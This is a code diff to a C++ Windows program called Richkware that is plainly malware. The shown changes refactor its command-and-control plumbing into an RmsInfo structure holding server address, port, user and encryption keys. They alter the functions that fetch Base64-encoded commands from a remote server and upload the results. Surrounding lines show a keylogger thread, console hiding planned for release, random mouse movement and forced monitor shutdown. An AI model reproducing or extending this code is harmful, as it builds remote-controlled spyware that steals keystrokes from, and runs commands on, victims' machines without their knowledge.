@@ -90,8 +90,8 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
-std::vector<std::string> Richkware::getCommands(const std::string &encryptionKey) {
-    std::string commands = network.fetchCommand(encryptionKey);
+std::vector<std::string> Richkware::getCommands() {
+    std::string commands = network.fetchCommand();
     std::string decodedCommands = Base64_decode(commands);
     std::vector<std::string> commandList;
     std::vector<std::string> result;
@@ -133,8 +133,8 @@ void Richkware::Hibernation() {
                 SC_MONITORPOWER, (LPARAM) 2);
 }
 
-void Richkware::uploadCommandsResponse(std::string output, const std::string &encryptionKey) {
-    network.uploadCommand(output, encryptionKey);
+void Richkware::uploadCommandsResponse(std::string output) {
+    network.uploadCommand(output);
 }
 
 
@@ -165,8 +165,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 
 }
 
-Richkware::Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
-                     const char *port, const char *associatedUser) {
+Richkware::Richkware(const char *AppNameArg, RmsInfo rmsInfo) {
     appName = AppNameArg;
     // TODO RELEASE UNCOMMENT before release
     // Hide console
@@ -174,18 +173,19 @@ Richkware::Richkware(const char *AppNameArg, const std::string &defaultEncryptio
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
-    Crypto crypto(defaultEncryptionKey);
+    Crypto crypto(rmsInfo.defaultEncryptionKey);
     std::string encKey = systemStorage.LoadValueFromFile(appName + "_encKey.richk");
 
     if (encKey.empty()) {
         // Key Exchange with Richkware-Manager-Server, using defaultEncryptionKey.
         //OLD Network network1(defaultEncryptionKey);
         //OLD encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
-        encKey = Network::GetEncryptionKeyFromRMS(serverAddress, port, associatedUser, defaultEncryptionKey);
+        encKey = Network::GetEncryptionKeyFromRMS(rmsInfo.serverAddress, rmsInfo.port, rmsInfo.associatedUser,
+                                                  rmsInfo.defaultEncryptionKey);
 
         if (encKey.empty() || (encKey.compare("Error") == 0)) {
             // Key Exchange failed
-            encryptionKey = defaultEncryptionKey;
+            encryptionKey = rmsInfo.defaultEncryptionKey;
         } else {
             // Key Exchange succeed
             encryptionKey = encKey;
@@ -199,7 +199,8 @@ Richkware::Richkware(const char *AppNameArg, const std::string &defaultEncryptio
         encryptionKey = encKey;
     }
 
-    network = Network(serverAddress, port, associatedUser, encryptionKey, defaultEncryptionKey);
+    network = Network(rmsInfo.serverAddress, rmsInfo.port, rmsInfo.associatedUser, encryptionKey,
+                      rmsInfo.defaultEncryptionKey);
     session = Session(encryptionKey, AppNameArg);
     blockApps = BlockApps();
 }
@@ -231,4 +232,13 @@ DWORD WINAPI KeyloggerThread(void *arg) {
         file.close();
         condSession = true;
     }
+}
+
+RmsInfo::RmsInfo(const char *defaultEncryptionKeyArg, const char *serverAddressArg, const char *portArg,
+                 const char *serviceNameArg, const char *associatedUserArg) {
+    defaultEncryptionKey = defaultEncryptionKeyArg;
+    serverAddress = serverAddressArg;
+    port = portArg;
+    serviceName = serviceNameArg;
+    associatedUser = associatedUserArg;
 }
